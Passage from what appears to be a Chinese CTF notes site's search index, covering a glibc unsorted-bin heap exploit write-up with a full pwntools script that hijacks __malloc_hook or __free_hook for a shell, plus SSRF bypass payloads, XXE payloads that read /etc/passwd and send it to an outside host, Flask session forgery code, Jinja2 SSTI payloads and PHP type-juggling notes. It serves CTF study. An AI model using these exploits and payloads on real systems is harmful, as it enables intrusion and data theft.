\u4e2d\u901a\u8fc7\u8bbe\u8ba1\uff0c\u5c06\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u7684 name \u7684\u5757\uff0c\u653e\u5165\u4e86unsorted bin \u94fe\u4e2d\uff0c\u7136\u540e\u901a\u8fc7 unsorted bin \u7684 sort \u7684\u673a\u5236\uff0c\u88ab\u653e\u5165\u4e86 small bins \u4e2d\uff0c\u4e00\u4e2a name \u7684 chunk \u5373\u5c06\u53d8\u6210\u53e6\u4e00\u4e2a add() \u4e2d\u7684 struct P \u60f3\u60f3\u5c31\u6fc0\u52a8 \u60f3\u60f3\u9700\u8981\u6ee1\u8db3\u4e9b\u4ec0\u4e48\u6761\u4ef6\uff0c\u6700\u8d77\u7801 bk \u7684\u94fe\u9700\u8981\u5faa\u73af\uff0cfd \u7684\u94fe\u5219\u4e0d\u7528\uff0cunsorted_bins(av)- bk \u7684 fd \u5fc5\u987b\u662f main_arena+88 \uff0c\u5bf9\u4e8e unsorted_bins(av)- bk \u5fc5\u987b\u6307\u5411\u9700\u8981\u6784\u9020\u94fe\u7684\u6700\u4e0b\u9762\u90a3\u4e2a chunk \u3002\u4e0d\u59a8\u5c06 unsorted_bins(av) \u7684|fd bk| \u770b\u6210\u4e00\u4e2achunk, chunk A\uff0c unsorted bins \u94fe\u4e2d\u95f4\u4e00\u5757\u770b\u6210 chunk B\uff0cunsorted_bins(av)- bk \u770b\u6210 chunk C \u76ee\u6807\uff1a unsorted bins A = B = C A.bk == C C.bk == B B.bk == A (main_arena+88) C.fd == A (main_arena+88) \u6700\u96be\u5904\u7406\u7684\u5730\u65b9\u5728\u4e8e\uff0c\u6211\u4eec\u9700\u8981\u8ba9 name \u7684\u90a3\u4e2a chunk \u6bd4 \u6b63\u89c4\u7684 unsorted bins \u5148\u51fa\u53bb\uff0c\u5426\u5219 name \u90a3\u4e2a chunk \u4f1a\u56e0\u4e3a unosrted bins \u7684\u673a\u5236\u4e0d\u80fd\u88ab sort \u51fa\u53bb\uff0c\u90a3\u4e48 unsorted bins (av)- bk == fake (name chunk) \uff0c\u4f46\u662f\u5728 unsorted bins \u7684 malloc \u7684\u65f6\u5019\uff0c\u5c06 unsorted_bins (av)- bk \u8fd9\u4e2a chunk \u7684 bk \u503c\u6539\u53d8\uff0cunsorted_bins (av) \u7684 bk \u503c\u4e5f\u5c31\u80fd\u53d8\u4e86\uff0c\u6240\u4ee5 \u4f2a\u9020\u4e00\u4e2a unsorted_bins (av)- bk \u7684\u5047 bk \u503c\u3002 exp : main_arena = libc.address + 0x3c4b20 system = libc.sym[ system ] __malloc_hook = libc.sym[ __malloc_hook ] __free_hook = libc.sym[ __free_hook ] # one_gadget = libc.address + 0xf02a4 / 0xf1147 both can get shell one_gadget = libc.address + 0xf1147 log.info( hijack unsorted bin ) delete(5) modify(5, 0x20, p64(heap_base+0x20)*2) add(0x10, G *0xF, 0x80, p64(main_arena+88)*4) modify(0, 0x20, \\x90 *0x20) delete(0) add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)","title":"\u6784\u9020 fake unsorted bin \u94fe"},{"location":"pwn/unsorted-bin/#gdb","text":"","title":"gdb \u8c03\u8bd5"},{"location":"pwn/unsorted-bin/#delete5-modify","text":"pwndbg parseheap addr prev size status fd bk 0x55c846963000 0x0 0x20 Used None None 0x55c846963020 0x0 0x20 Used None None 0x55c846963040 0x0 0xa0 Used None None 0x55c8469630e0 0xa0 0x20 Used None None 0x55c846963100 0x0 0x20 Used None None 0x55c846963120 0x0 0xa0 Used None None 0x55c8469631c0 0xa0 0x20 Used None None 0x55c8469631e0 0x0 0x20 Used None None 0x55c846963200 0x0 0xa0 Used None None 0x55c8469632a0 0x0 0x20 Used None None 0x55c8469632c0 0x0 0x20 Used None None 0x55c8469632e0 0x0 0xa0 Used None None 0x55c846963380 0x0 0x20 Freed 0x55c8469633a0 None 0x55c8469633a0 0x0 0x20 Freed 0x0 None 0x55c8469633c0 0x0 0xa0 Freed 0x7fa141c14b78 0x7fa141c14b78 0x55c846963460 0xa0 0x20 Used None None 0x55c846963480 0x0 0x20 Used None None 0x55c8469634a0 0x0 0xa0 Used None None 0x55c8469633c0 0x0 0xa0 Freed 0x55c846963020 0x55c846963020","title":"delete(5) &amp; modify()"},{"location":"pwn/unsorted-bin/#add-modify0","text":"modify(0) \u4ec5\u4ec5\u662f\u4e3a\u4e86\u8ba9 0x2020E0 \u8bb0\u5f55 Array[0] pwndbg p main_arena $1 = { mutex = 0, flags = 0, fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, top = 0x55c846963540, last_remainder = 0x55c8469633c0, bins = {0x55c8469633c0, 0x55c846963020, 0x7fa141c14b88 main_arena+104 , 0x7fa141c14b88 main_arena+104 , 0x7fa141c14b98 main_arena+120 , 0x7fa141c14b98 main_arena+120 , 0x7fa141c14ba8 main_arena+136 , 0x7fa141c14ba8 main_arena+136 , 0x7fa141c14bb8 main_arena+152 , 0x7fa141c14bb8 main_arena+152 , 0x7fa141c14bc8 main_arena+168 , 0x7fa141c14bc8 main_arena+168 , 0x7fa141c14bd8 main_arena+184 , 0x7fa141c14bd8 main_arena+184 , 0x7fa141c14be8 main_arena+200 ...}, binmap = {16777216, 0, 0, 0}, next = 0x7fa141c14b20 main_arena , next_free = 0x0, attached_threads = 1, system_mem = 135168, max_system_mem = 135168 }","title":"add() &amp; modify(0)"},{"location":"pwn/unsorted-bin/#delete0-add0x10-p64main_arena88p64heap_base0x120-0x80-p64main_arena884","text":"\u8fdb\u884c unsorted bin bk \u7684\u5faa\u73af\u95ed\u5408 \u8fd9\u4e2a\u5730\u65b9\u6211\u6ca1\u4e0b\u65ad\u70b9\u4e0b\u597d\uff0c\u8bb2\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u5230\u4e86\u8fd9\u4e00\u6b65\u5427\uff0c\u5728 add() \u4e2d\uff0c malloc(0x10) \u4e4b\u540e malloc(0x10) \uff0c\u8fd9\u4e2a\u5c31\u662f heap_base + 0x20 \u5373 \u4e0a\u9762\u8bb2\u7684 chunk C \u5728\u904d\u5386 unsorted bins \u65f6\uff0c\u4f1a\u5148\u5c06 0x20 \u62ff\u51fa\u6765\uff0c\u518d\u628a unsorted bins \u62ff\u51fa\u6765 unsorted_bins(av)- bk = (0x20) (0x20).fd = unsorted_bins(av) / main_arena+88 (0x20).bk = (0x120) (0x120).bk = unsorted_bins(av) / main_arena+88 (0x120).fd = unsorted_bins(av) / main_arena+88 pwndbg parseheap addr prev size status fd bk 0x55c846963000 0x0 0x20 Freed 0x55c846963020 None 0x55c846963020 0x0 0x20 Freed 0x0 None 0x55c846963040 0x0 0xa0 Used None None 0x55c8469630e0 0xa0 0x20 Used None None 0x55c846963100 0x0 0x20 Used None None 0x55c846963120 0x0 0xa0 Freed 0x55c8469633c0 0x7fa141c14b78 \u795e\u5947\u7684\u73b0\u8c61\u53d1\u751f\u4e86 pwndbg heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x55c846963540 (size : 0x20ac0) last_remainder: 0x55c8469633c0 (size : 0xa0) unsortbin: 0x0 (0x020) smallbin[ 0]: 0x55c846963020 \u5f00\u5f00\u5fc3\u5fc3","title":"delete(0) &amp; add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)"},{"location":"pwn/unsorted-bin/#hijack","text":"\u6211\u8bd5\u4e86\u4e24\u79cd\uff0c\u4e00\u79cd hijack __malloc_hook = one_gadget \u53e6\u5916\u4e00\u79cd __free_hook = system \uff0c\u90fd\u53ef\u884c","title":"hijack"},{"location":"pwn/unsorted-bin/#exp1","text":"# one_gadget = libc.address + 0xf02a4 / 0xf1147 both can get shell one_gadget = libc.address + 0xf1147 # exp 1 : hijack __malloc_hook = one_gadget log.info( last step : hijack __malloc_hook = one_gadget ) add(0x10, 1 *0x10, 0x80, 1 *0x20) delete(0) add(0x10, p64(__malloc_hook)*2, 0x80, get shell ) edit_len_0(6, p64(one_gadget), p64(one_gadget)) pause() log.info( Get shell ) io.sendlineafter( , 1 )","title":"exp1"},{"location":"pwn/unsorted-bin/#exp2","text":"# exp 2 : hijack __free_hook = system log.info( last step : hijack __free_hook = system ) add(0x10, 1 *0x20, 0x80, /bin/sh\\x00 ) delete(0) add(0x10, /bin/sh\\x00 + p64(__free_hook), 0x80, /bin/sh\\x00 ) edit_len_0(6, p64(system), p64(system)) pause() log.info( Get shell ) delete(0)","title":"exp2"},{"location":"pwn/unsorted-bin/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * from time import sleep import os import sys elfPath = ./homura libcPath = ./libc-2.23.so Addr = Port = 0 context.log_level = debug context.binary = elfPath elf = context.binary if sys.argv[1] == l : io = process(elfPath) libc = elf.libc else: if sys.argv[1] == d : io = process(elfPath, env = { LD_PRELOAD : libcPath}) context.log_level = info else : io = remote(Addr, Port) context.log_level = info if libcPath: libc = ELF(libcPath) success = lambda name, value: log.success( {} - {:#x} .format(name, value)) def add(lenth, name, size, message): io.sendlineafter( , 1 ) io.sendlineafter( name: , str(int(lenth))) if lenth != 0: io.sendlineafter( name: , name) io.sendlineafter( message: , str(int(size))) io.sendlineafter( message: , message) def delete(idx): io.sendlineafter( , 2 ) io.sendlineafter( index: , str(idx)) def modify(idx, size, message): io.sendlineafter( , 3 ) io.sendlineafter( index: , str(idx)) io.sendlineafter( size: , str(int(size))) if size != 0: io.sendlineafter( , message) def leak(idx, size, message): io.sendlineafter( , 3 ) io.sendlineafter( index: , str(idx)) io.sendlineafter( size: , str(int(size))) io.recvuntil( \\x20 ) value = u64(io.recvuntil( \\x20 , drop=True).ljust(8, \\x00 )) if size != 0: io.sendlineafter( , message) return value def edit_len_0(idx, s, v2): io.sendlineafter( , 5 ) io.sendlineafter( index: , str(idx)) io.sendlineafter( message , s) io.sendlineafter( ! , v2) if __name__ == __main__ : [*] Test case 5: pause() add(0x10, A *0xF, 0x80, a *0x20) vuln(0, B *0x7, b *0x1F) log.info( leak heap ) add(0x10, A *0xF, 0x80, a *0x20) # 0 add(0x10, B *0xF, 0x80, b *0x20) # 1 add(0x10, C *0xF, 0x80, c *0x20) # 2 modify(0, 0x21, a *0x20) delete(1) delete(0) add(0, , 0, ) heap_base = leak(0, 0, ) - 0xe0 success( heap , heap_base) pause() log.info( leak libc ) add(0x10, D *0xF, 0x80, d *0x20) # 1 add(0x10, E *0xF, (0xa0+0x20+0xa0), e *0x20) # 3 add(0x10, F *0xF, 0x80, f *0x20) # 4 delete(3) add(0, , 0, ) # 5 add(0, , 0, ) # 6 libc.address = leak(5, 0, ) - 88 - 0x3c4b20 success( libc , libc.address) pause() # log.info( hijack global_max_fast ) # global_max_fast 0x7f6c5d5b87f8 # libc 0x7f6c5d1f2000 # global_max_fast = libc.address + 0x3c67f8 # _IO_list_all = libc.sym[ _IO_list_all ] 0x45216 execve( /bin/sh , rsp+0x30, environ) constraints: rax == NULL 0x4526a execve( /bin/sh , rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf02a4 execve( /bin/sh , rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1147 execve( /bin/sh , rsp+0x70, environ) constraints: [rsp+0x70] == NULL main_arena = libc.address + 0x3c4b20 system = libc.sym[ system ] __malloc_hook = libc.sym[ __malloc_hook ] __free_hook = libc.sym[ __free_hook ] # one_gadget = libc.address + 0xf02a4 / 0xf1147 both can get shell one_gadget = libc.address + 0xf1147 log.info( hijack unsorted bin ) delete(5) modify(5, 0x20, p64(heap_base+0x20)*2) add(0x10, G *0xF, 0x80, p64(main_arena+88)*4) modify(0, 0x20, \\x90 *0x20) delete(0) add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4) # exp 1 : hijack __malloc_hook = one_gadget log.info( last step : hijack __malloc_hook = one_gadget ) add(0x10, 1 *0x10, 0x80, 1 *0x20) delete(0) add(0x10, p64(__malloc_hook)*2, 0x80, get shell ) edit_len_0(6, p64(one_gadget), p64(one_gadget)) pause() log.info( Get shell ) io.sendlineafter( , 1 ) # exp 2 : hijack __free_hook = system log.info( last step : hijack __free_hook = system ) add(0x10, 1 *0x20, 0x80, /bin/sh\\x00 ) delete(0) add(0x10, /bin/sh\\x00 + p64(__free_hook), 0x80, /bin/sh\\x00 ) edit_len_0(6, p64(system), p64(system)) pause() log.info( Get shell ) delete(0) io.interactive() io.close()","title":"\u5b8c\u6574 exp"},{"location":"web/ssrf/","text":"SSRF\u76f8\u5173 SSRF\u4e4bPHP filter_val parse_url \u9650\u5b9ahost bypass \u5229\u7528\u6761\u4ef6\uff1a \u4f7f\u7528filter_val \u7528parse_url\u9650\u5b9ahost \u9650\u5b9ahost\u65f6\u4f7f\u7528\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f filter_var($url, FILTER_VALIDATE_URL) \u8fd4\u56de $url \u662f\u5426\u662f\u4e00\u4e2a\u6709\u6548\u7684url payload: url=0://evil.com:80,felinae.cn:80/ url=0://evil.com:23333;felinae98.cn:80/ Reference\uff1a https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/ libcurl parse_url() \u5229\u7528\u6761\u4ef6\uff1a \u7528parse_url\u9650\u5236host \u9650\u5236\u4e86schema\uff08\u4e0d\u7136\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e00\u4e2a\uff09 \u539f\u7406 http://u:p@a.com:80@b.com/ parse_url\u89e3\u6790\u7ed3\u679c\uff1a schema: http host: b.com user: u pass: p@a.com:80 libcurl\u89e3\u6790\u7ed3\u679c\uff1a schema: http host: a.com user: u pass: p port: 80 @b.com \u4f1a\u88ab\u5ffd\u7565","title":"SSRF"},{"location":"web/ssrf/#ssrf","text":"","title":"SSRF\u76f8\u5173"},{"location":"web/ssrf/#ssrfphp","text":"","title":"SSRF\u4e4bPHP"},{"location":"web/ssrf/#filter_val-parse_url-host-bypass","text":"\u5229\u7528\u6761\u4ef6\uff1a \u4f7f\u7528filter_val \u7528parse_url\u9650\u5b9ahost \u9650\u5b9ahost\u65f6\u4f7f\u7528\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f filter_var($url, FILTER_VALIDATE_URL) \u8fd4\u56de $url \u662f\u5426\u662f\u4e00\u4e2a\u6709\u6548\u7684url payload: url=0://evil.com:80,felinae.cn:80/ url=0://evil.com:23333;felinae98.cn:80/ Reference\uff1a https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/","title":"filter_val parse_url \u9650\u5b9ahost bypass"},{"location":"web/ssrf/#libcurl-parse_url","text":"\u5229\u7528\u6761\u4ef6\uff1a \u7528parse_url\u9650\u5236host \u9650\u5236\u4e86schema\uff08\u4e0d\u7136\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e00\u4e2a\uff09 \u539f\u7406 http://u:p@a.com:80@b.com/ parse_url\u89e3\u6790\u7ed3\u679c\uff1a schema: http host: b.com user: u pass: p@a.com:80 libcurl\u89e3\u6790\u7ed3\u679c\uff1a schema: http host: a.com user: u pass: p port: 80 @b.com \u4f1a\u88ab\u5ffd\u7565","title":"libcurl parse_url()"},{"location":"web/xxe/","text":"XML External Entity DTD\uff1a \u6587\u6863\u7c7b\u578b\u5b9a\u4e49 \u57fa\u672c\u64cd\u4f5c\uff1a ?xml version= 1.0 ? !DOCTYPE a [ !ENTITY content SYSTEM file:///etc/passwd ] value content; /value \u5916\u90e8\u5f15\u5165\uff1a ?xml version= 1.0 ? !DOCTYPE a [ !ENTITY % d SYSTEM http://example.com/evil.dtd %d; ] value b; /value evil.dtd: !ENTITY d SYSTEM file:///etc/passwd \u5411\u5916\u53d1\u9001\uff1a ?xml version= 1.0 ? !DOCTYPE r [ !ELEMENT r ANY !ENTITY % sp SYSTEM http://1.3.3.7:8000/xxe.dtd %sp; %param1; ] r exfil; /r xxe.dtd !ENTITY % data SYSTEM php://filter/convert.base64-encode/resource=/etc/passwd !ENTITY % param1 !ENTITYexfil SYSTEM http://x.x.x.x:8090/?%data;","title":"XXE"},{"location":"web/xxe/#xml-external-entity","text":"DTD\uff1a \u6587\u6863\u7c7b\u578b\u5b9a\u4e49 \u57fa\u672c\u64cd\u4f5c\uff1a ?xml version= 1.0 ? !DOCTYPE a [ !ENTITY content SYSTEM file:///etc/passwd ] value content; /value \u5916\u90e8\u5f15\u5165\uff1a ?xml version= 1.0 ? !DOCTYPE a [ !ENTITY % d SYSTEM http://example.com/evil.dtd %d; ] value b; /value evil.dtd: !ENTITY d SYSTEM file:///etc/passwd \u5411\u5916\u53d1\u9001\uff1a ?xml version= 1.0 ? !DOCTYPE r [ !ELEMENT r ANY !ENTITY % sp SYSTEM http://1.3.3.7:8000/xxe.dtd %sp; %param1; ] r exfil; /r xxe.dtd !ENTITY % data SYSTEM php://filter/convert.base64-encode/resource=/etc/passwd !ENTITY % param1 !ENTITYexfil SYSTEM http://x.x.x.x:8090/?%data;","title":"XML External Entity"},{"location":"web/flask/session/","text":"Session\u89e3\u5bc6\u4e0e\u7b7e\u540d\u4f2a\u9020 flask\u7684session\u662fclient session\uff0c\u5e76\u4e14\u53ef\u4ee5\u968f\u610f\u89e3\u5bc6 session\u89e3\u5bc6 #!/usr/bin/env python3 import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption ( payload ): payload , sig = payload . rsplit ( b . , 1 ) payload , timestamp = payload . rsplit ( b . , 1 ) decompress = False if payload . startswith ( b . ): payload = payload [ 1 :] decompress = True try : payload = base64_decode ( payload ) except Exception as e : raise Exception ( Could not base64 decode the payload because of an exception ) if decompress : try : payload = zlib . decompress ( payload ) except Exception as e : raise Exception ( Could not zlib decompress the payload before decoding the payload ) return session_json_serializer . loads ( payload ) if __name__ == __main__ : print ( decryption ( sys . argv [ 1 ] . encode ())) Session\u4f2a\u9020 from hashlib import sha512 from flask.sessions import session_json_serializer from itsdangerous import URLSafeTimedSerializer , BadTimeSignature import base64 import zlib PAYLOAD = { Admin : True } signer = URLSafeTimedSerializer ( secret-key , salt = cookie-session , serializer = session_json_serializer , signer_kwargs = { key_derivation : hmac , digest_method : sha512 } ) print ( signer . dumps ( PAYLOAD )) Reference https://www.leavesongs.com/PENETRATION/client-session-security.html https://terryvogelsang.tech/MITRECTF2018-my-flask-app/","title":"session\u89e3\u5bc6"},{"location":"web/flask/session/#session","text":"flask\u7684session\u662fclient session\uff0c\u5e76\u4e14\u53ef\u4ee5\u968f\u610f\u89e3\u5bc6","title":"Session\u89e3\u5bc6\u4e0e\u7b7e\u540d\u4f2a\u9020"},{"location":"web/flask/session/#session_1","text":"#!/usr/bin/env python3 import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption ( payload ): payload , sig = payload . rsplit ( b . , 1 ) payload , timestamp = payload . rsplit ( b . , 1 ) decompress = False if payload . startswith ( b . ): payload = payload [ 1 :] decompress = True try : payload = base64_decode ( payload ) except Exception as e : raise Exception ( Could not base64 decode the payload because of an exception ) if decompress : try : payload = zlib . decompress ( payload ) except Exception as e : raise Exception ( Could not zlib decompress the payload before decoding the payload ) return session_json_serializer . loads ( payload ) if __name__ == __main__ : print ( decryption ( sys . argv [ 1 ] . encode ()))","title":"session\u89e3\u5bc6"},{"location":"web/flask/session/#session_2","text":"from hashlib import sha512 from flask.sessions import session_json_serializer from itsdangerous import URLSafeTimedSerializer , BadTimeSignature import base64 import zlib PAYLOAD = { Admin : True } signer = URLSafeTimedSerializer ( secret-key , salt = cookie-session , serializer = session_json_serializer , signer_kwargs = { key_derivation : hmac , digest_method : sha512 } ) print ( signer . dumps ( PAYLOAD ))","title":"Session\u4f2a\u9020"},{"location":"web/flask/session/#reference","text":"https://www.leavesongs.com/PENETRATION/client-session-security.html https://terryvogelsang.tech/MITRECTF2018-my-flask-app/","title":"Reference"},{"location":"web/flask/ssti/","text":"\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165 Server Side Template Injection render_template_string() flask\u4e2d\u81ea\u5e26\u51fd\u6570 \u53ef\u4ee5\u5957\u51faflask\u4e2d\u76f8\u5173\u53d8\u91cf payloads: {{ config }} \u83b7\u53d6Secret Key {{ request.environ }} \u670d\u52a1\u5668\u4fe1\u606f {{ url_for.__globals__}} \u5168\u5c40\u51fd\u6570\u4e2d\u7684\u597d\u4e1c\u897f {{url_for.__globals__['current_app'].config}} \u540c\u7b2c\u4e00\u4e2a {{session}} session\u5bf9\u8c61 {{ [].class.base.subclasses() }} {{''.class.mro()[1].subclasses()}} \u83b7\u53d6\u6240\u6709\u7c7b \u66f4\u591a\u89c1 \u5f85\u586b\u5751\u7684 Python jail \u7ed5\u8fc7 _ exploit={{request[request.args.param]}} param=__class__ . \u6216 [] \u4f7f\u7528jinja2 filters |attr() exploit={{request|attr(request.args.param)}} param=__class__ __getitem__() \u9ed1\u540d\u5355\u8bcd\u7ed5\u8fc7 \u7528join exploit={{request|attr(request.args.getlist(request.args.l)|join)}} l=a a=_ a=_ a=class a=_ a=_ \u7528format exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}} f=%s%sclass%s%s a=_ Reference https://www.freebuf.com/articles/web/98619.html https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti http://jinja.pocoo.org/docs/dev/templates/#builtin-globals https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html https://portswigger.net/blog/server-side-template-injection","title":"\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165"},{"location":"web/flask/ssti/#_1","text":"Server Side Template Injection","title":"\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165"},{"location":"web/flask/ssti/#render_template_string","text":"flask\u4e2d\u81ea\u5e26\u51fd\u6570 \u53ef\u4ee5\u5957\u51faflask\u4e2d\u76f8\u5173\u53d8\u91cf","title":"render_template_string()"},{"location":"web/flask/ssti/#payloads","text":"{{ config }} \u83b7\u53d6Secret Key {{ request.environ }} \u670d\u52a1\u5668\u4fe1\u606f {{ url_for.__globals__}} \u5168\u5c40\u51fd\u6570\u4e2d\u7684\u597d\u4e1c\u897f {{url_for.__globals__['current_app'].config}} \u540c\u7b2c\u4e00\u4e2a {{session}} session\u5bf9\u8c61 {{ [].class.base.subclasses() }} {{''.class.mro()[1].subclasses()}} \u83b7\u53d6\u6240\u6709\u7c7b \u66f4\u591a\u89c1 \u5f85\u586b\u5751\u7684 Python jail","title":"payloads:"},{"location":"web/flask/ssti/#_2","text":"_ exploit={{request[request.args.param]}} param=__class__ . \u6216 [] \u4f7f\u7528jinja2 filters |attr() exploit={{request|attr(request.args.param)}} param=__class__ __getitem__() \u9ed1\u540d\u5355\u8bcd\u7ed5\u8fc7 \u7528join exploit={{request|attr(request.args.getlist(request.args.l)|join)}} l=a a=_ a=_ a=class a=_ a=_ \u7528format exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}} f=%s%sclass%s%s a=_","title":"\u7ed5\u8fc7"},{"location":"web/flask/ssti/#reference","text":"https://www.freebuf.com/articles/web/98619.html https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti http://jinja.pocoo.org/docs/dev/templates/#builtin-globals https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html https://portswigger.net/blog/server-side-template-injection","title":"Reference"},{"location":"web/php/LFI/","text":"Reference","title":"\u6587\u4ef6\u5305\u542b"},{"location":"web/php/LFI/#reference","text":"","title":"Reference"},{"location":"web/php/audit/","text":"PHP\u76f8\u5173 php\u662f\u6700\u597d\u7684\u8bed\u8a00\uff01 PHP\u5f31\u7c7b\u578b var_dump('0xABCdef' == ' 0xABCdef'); true (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false) var_dump('0010e2' == '1e3\u2019); true strcmp([],[]) 0 sha1([]) NULL '123' == 123 'abc' == 0 '0x01' == 1 PHP 7.0\u540e\uff0c16\u4f4d\u5b57\u7b26\u4e32\u4e0d\u5728\u5f53\u6210\u6570\u5b57\uff08 '0x01 != 1' \uff09 0 == '' == false == NULL $a = 'a' ++$a = 'b' $a+1 = 1 PHP \u5168\u5c40\u53d8\u91cf $_GET \u4f1a\u5bf9\u4f20\u5165\u7684\u6570\u636e\u8fdb\u884cURLdecode $_SERVER['REQUEST_URI'] \u548c $_SERVER['QUERY_STRING'] \u5219\u662f\u76f4\u63a5\u8fd4\u56de PHP\u51fd\u6570\u7279\u6027 intval \u56db\u820d\u4e94\u5165(\u4e0d\u5b58\u5728\u7684\u622a\u65ad) var_dump(intval('5278.78')) = 5278 intval(012) = 10 intval(\"012\") = 12 extract int extract ( array $array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) \u63d0\u53d6\u51fa\u6570\u7ec4\u4e2d\u7684\u952e\u503c\uff0c\u8986\u76d6\u8fdb\u53d8\u91cf .php?_SESSION[name]=admin \u5c06admin\u8986\u76d6\u5165session trim string trim ( string $str [, string $character_mask = \\t\\n\\r\\0\\x0B ] ) \u53bb\u6389\u5b57\u7b26\u4e32\u524d\u540e\u7a7a\u767d\u5b57\u7b26 \u9ed8\u8ba4\u53bb\u6389\u4ee5\u4e0b\u5b57\u7b26 \" \" (0x20) \"\\t\" (0x09) \"\\n\" (0x0A) \"\\x0B\" (0x0B) \"\\r\" (0x0D) \"\\0\" (0x00) \u53ef\u4ee5\u9ed8\u8ba4\u4e0d\u5305\u542b \"\\f\" (0x0C) \u6bd4\u8f83\uff1ais_numeric()\u5141\u8bb8 \\f \u5728\u5f00\u5934 in_array bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) \u9ed8\u8ba4\u4f7f\u7528\u677e\u6563\u6bd4\u8f83 \u5224\u65ad\u503c\u662f\u5426\u5728\u6570\u7ec4\u4e2d\u800c\u4e0d\u662f\u952e\u662f\u5426\u5728\u6570\u7ec4\u4e2d array_search mixed array_search(mixed $needle , array $haystack [, bool $strict = false ]) \u4e0ein_array\u7c7b\u4f3c\uff0c\u6210\u529f\u8fd4\u56deindex\uff0c\u5931\u8d25\u8fd4\u56deFALSE parse_str void parse_str ( string $encoded_string [, array $result ] ) \u53d8\u91cf\u8986\u76d6\uff0c\u4e0eextract\u7c7b\u4f3c\uff0c\u4f20\u5165\u7684\u662furlencode\u8fc7\u7684\u5b57\u7b26\u4e32\uff0c\u4f20\u5165\u6307\u5b9a\u6570\u7ec4\uff0c\u6307\u5b9a\u6570\u7ec4\u672a\u8bbe\u7f6e\uff0c\u4f1a\u8986\u76d6\u5168\u5c40\u53d8\u91cf \u53d8\u91cf\u540d\u4e2d\u6709 \uff08\u7a7a\u683c\uff09\u6216 . \uff08\u70b9\uff09\uff0c\u4f1a\u88ab\u66ff\u6362\u6210 _ \uff08\u4e0b\u5212\u7ebf\uff09 parse_url \u5728\u5904\u7406URL\u65f6\u4f1a\u6709\u95ee\u9898 parse_url('/a.php?id=1') array(2) { [ host ]= string(5) a.php [ query ]= string(4) id=1 } - parse_url('//a/b') host: a parse_url('..//a/b/c:80') host: .. port: 80 path: //a/b/c:80 parse_url('///a.php?id=1') false parse_url('/a.php?id=1:80') PHP 7.0.0 false PHP = 7.0.0 array(2) { [ path ]= string(6) /a.php [ query ]= string(7) id=1:80 } parse_url('http://kaibro.tw:87878') 5.3.X\u7248\u672c\u4ee5\u4e0b array(3) { [ scheme ]= string(4) http [ host ]= string(9) kaibro.tw [ port ]= int(22342) } \u5176\u4ed6\uff1a false preg_replace mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int $count ]] ) \u641c\u5bfb $subject \u4e2d\u5339\u914d\u7684 $pattern \uff0c\u5e76\u7528 $replacement \u66ff\u6362 \u7b2c\u4e00\u4e2a\u53c2\u6570\u7528 /e \u4fee\u9970\u7b26\uff0c $replacement \u4f1a\u88ab\u5f53\u6210PHP code\u6267\u884c \u5fc5\u987b\u6709\u5339\u914d\u5230\u624d\u4f1a\u6267\u884c PHP 5.5.0\u8d77\uff0c\u6703\u7522\u751f E_DEPRECATED \u9519\u8bef PHP 7.0.0\u4e0d\u518d\u652f\u63f4\uff0c\u7528 preg_replace_callback() \u4ee3\u66ff example: ?php $a = phpkaibro ; echo preg_replace ( /(.*)kaibro/e , \\\\1info() , $a ); sprintf/vprintf \u6253\u5370\u683c\u5f0f\uff1a % \u6807\u5fd7\u8fd9\u4e00\u4e2a\u683c\u5f0f\u5316\u4f4d\u7f6e\u7684\u8d77\u70b9 [num]$ \u9009\u62e9\u7b2c [num] \u4e2a\u53c2\u6570 + \u6216 - \u5f3a\u5236\u663e\u793a\u7b26\u53f7\uff08\u9ed8\u8ba4\u663e\u793a\u8d1f\u53f7\uff0c\u5ffd\u7565\u6b63\u53f7\uff09(\u53ef\u9009) 0 \u6216 '[char] \u4ee50\u6216\u8005 [char] \u4f5c\u4e3a\u586b\u5145\u5b57\u7b26\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u683c\uff08\u53ef\u9009\uff09 \u6570\u5b57\uff0c\u89c4\u5b9a\u6253\u5370\u5bbd\u5ea6\uff08\u53ef\u9009\uff09 .[num] 